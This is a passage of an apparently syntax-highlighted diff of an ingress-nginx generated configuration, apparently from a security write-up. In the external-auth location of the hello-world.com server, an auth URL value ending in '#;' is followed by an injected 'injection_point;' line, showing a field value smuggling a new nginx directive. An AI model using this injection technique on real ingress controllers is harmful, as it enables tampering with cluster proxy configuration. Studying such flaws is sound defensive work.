+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">log_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">balancer.log()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">monitor.call()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">port_in_redirect</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $balancer_ewma_score <span style="color:#e6db74">-1</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;upstream-default-backend&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_host          $proxy_upstream_name;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_access_scheme  $scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_server_port    $server_port;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $best_http_host      $http_host;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_port           $pass_server_port;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_alternative_upstream_name <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">client_max_body_size</span>                    <span style="color:#ae81ff">1m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Host</span>                   $best_http_host;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the extracted client certificate to the backend
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Allow websocket connections
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span>                        <span style="color:#e6db74">Upgrade</span>           $http_upgrade;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>                        <span style="color:#e6db74">Connection</span>        $connection_upgrade;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Request-ID</span>           $req_id;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Real-IP</span>              $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-For</span>        $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Host</span>       $best_http_host;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Port</span>       $pass_port;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Proto</span>      $pass_access_scheme;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Scheme</span>     $pass_access_scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Scheme</span>               $pass_access_scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the original X-Forwarded-For
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Original-Forwarded-For</span> $http_x_forwarded_for;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># mitigate HTTPoxy Vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># https://www.nginx.com/blog/mitigating-the-httpoxy-vulnerability-with-nginx/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Proxy</span>                  <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Custom headers to proxied server
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_connect_timeout</span>                   <span style="color:#e6db74">5s</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_send_timeout</span>                      <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_read_timeout</span>                      <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffering</span>                         <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffer_size</span>                       <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffers</span>                           <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_max_temp_file_size</span>                <span style="color:#ae81ff">1024m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_request_buffering</span>                 <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_http_version</span>                      <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_cookie_domain</span>                     <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_cookie_path</span>                       <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># In case of errors try the next upstream server before returning an error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_next_upstream</span>                     <span style="color:#e6db74">error</span> <span style="color:#e6db74">timeout</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_next_upstream_timeout</span>             <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_next_upstream_tries</span>               <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_pass</span> <span style="color:#e6db74">http://upstream_balancer</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_redirect</span>                          <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># health checks in cloud providers require the use of port 80
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/healthz</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">return</span> <span style="color:#ae81ff">200</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># this is required to avoid error if nginx is being monitored
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e"># with an external software (like sysdig)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/nginx_status</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">allow</span> <span style="color:#ae81ff">127</span><span style="color:#e6db74">.0.0.1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">allow</span> ::<span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">deny</span> <span style="color:#e6db74">all</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">stub_status</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">## end server _
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">## start server hello-world.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">server</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">server_name</span> <span style="color:#e6db74">hello-world.com</span> ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">http2</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">80</span>  ;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:80</span>  ;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#ae81ff">443</span>  <span style="color:#e6db74">ssl</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:443</span>  <span style="color:#e6db74">ssl</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;-&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">ssl_certificate_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">certificate.call()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">location</span> = <span style="color:#e6db74">/_external-auth-Lw-Prefix</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">internal</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">access_log</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Ensure that modsecurity will not run on an internal location as this is not accessible from outside
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># ngx_auth_request module overrides variables in the parent request,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># therefore we have to explicitly set this variable again so that when the parent request
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># resumes it has the correct value set for this variable so that Lua can pick backend correctly
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;-web-8080&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_pass_request_body</span>     <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">Content-Length</span>          <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Forwarded-Proto</span>       <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Request-ID</span>            $req_id;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">Host</span>                    <span style="color:#e6db74">example.com</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Original-URL</span>          $scheme://$http_host$request_uri;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Original-Method</span>       $request_method;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Sent-From</span>             <span style="color:#e6db74">&#34;nginx-ingress-controller&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Real-IP</span>               $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Forwarded-For</span>        $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>            <span style="color:#e6db74">X-Auth-Request-Redirect</span> $request_uri;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffering</span>                         <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffer_size</span>                       <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffers</span>                           <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_request_buffering</span>                 <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_ssl_server_name</span>       <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_pass_request_headers</span>  <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">client_max_body_size</span>        <span style="color:#ae81ff">1m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the extracted client certificate to the auth provider
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_http_version</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $target <span style="color:#e6db74">http://example.com/</span><span style="color:#75715e">#;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#e6db74">injection_point</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_pass</span> $target;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $namespace      <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $ingress_name   <span style="color:#e6db74">&#34;example-ingress&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $service_name   <span style="color:#e6db74">&#34;web&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $service_port   <span style="color:#e6db74">&#34;8080&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $location_path  <span style="color:#e6db74">&#34;/&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $global_rate_limit_exceeding <span style="color:#e6db74">n</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">rewrite_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">lua_ingress.rewrite({</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">force_ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">ssl_redirect</span> = <span style="color:#e6db74">true,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">force_no_ssl_redirect</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">preserve_trailing_slash</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">use_port_in_redirects</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#e6db74">global_throttle</span> = { <span style="color:#f92672">namespace</span> = <span style="color:#e6db74">&#34;&#34;,</span> <span style="color:#e6db74">limit</span> = <span style="color:#ae81ff">0</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">window_size</span> = <span style="color:#ae81ff">0</span><span style="color:#e6db74">,</span> <span style="color:#e6db74">key</span> = { }<span style="color:#f92672">,</span> <span style="color:#e6db74">ignored_cidrs</span> = { } }<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">)</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">balancer.rewrite()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># be careful with `access_by_lua_block` and `satisfy any` directives as satisfy any
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># will always succeed when there&#39;s `access_by_lua_block` that does not have any lua code doing `ngx.exit(ngx.DECLINED)`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># other authentication method such as basic auth or external auth useless - all requests will be allowed.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">#access_by_lua_block {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e">#}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">header_filter_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">lua_ingress.header()</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">body_filter_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">log_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">balancer.log()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">monitor.call()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#e6db74">plugins.run()</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">port_in_redirect</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $balancer_ewma_score <span style="color:#e6db74">-1</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_upstream_name <span style="color:#e6db74">&#34;-web-8080&#34;</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_host          $proxy_upstream_name;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_access_scheme  $scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_server_port    $server_port;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $best_http_host      $http_host;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $pass_port           $pass_server_port;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">set</span> $proxy_alternative_upstream_name <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># this location requires authentication
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">auth_request</span>        <span style="color:#e6db74">/_external-auth-Lw-Prefix</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">auth_request_set</span>    $auth_cookie $upstream_http_set_cookie;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">add_header</span>          <span style="color:#e6db74">Set-Cookie</span> $auth_cookie;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">client_max_body_size</span>                    <span style="color:#ae81ff">1m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Host</span>                   $best_http_host;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the extracted client certificate to the backend
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Allow websocket connections
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span>                        <span style="color:#e6db74">Upgrade</span>           $http_upgrade;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span>                        <span style="color:#e6db74">Connection</span>        $connection_upgrade;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Request-ID</span>           $req_id;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Real-IP</span>              $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-For</span>        $remote_addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Host</span>       $best_http_host;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Port</span>       $pass_port;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Proto</span>      $pass_access_scheme;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Forwarded-Scheme</span>     $pass_access_scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Scheme</span>               $pass_access_scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Pass the original X-Forwarded-For
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">X-Original-Forwarded-For</span> $http_x_forwarded_for;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># mitigate HTTPoxy Vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#75715e"># https://www.nginx.com/blog/mitigating-the-httpoxy-vulnerability-with-nginx/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_set_header</span> <span style="color:#e6db74">Proxy</span>                  <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># Custom headers to proxied server
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_connect_timeout</span>                   <span style="color:#e6db74">5s</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_send_timeout</span>                      <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_read_timeout</span>                      <span style="color:#e6db74">60s</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffering</span>                         <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffer_size</span>                       <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_buffers</span>                           <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4k</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_max_temp_file_size</span>                <span style="color:#ae81ff">1024m</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_request_buffering</span>                 <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_http_version</span>                      <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_cookie_domain</span>                     <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_cookie_path</span>                       <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># In case of errors try the next upstream server before returning an error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#f92672">proxy_next_upstream</span>                     <span style="color:#e6db74">error</span> <span style="color:#e6db74">timeout</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_next_upstream_timeout</span>             <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_next_upstream_tries</span>               <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_pass</span> <span style="color:#e6db74">http://upstream_balancer</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">proxy_redirect</span>                          <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">## end server hello-world.com
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">## start server hello-world.example
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">server</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">server_name</span> <span style="color:#e6db74">hello-world.example</span> ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">http2</span> <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>
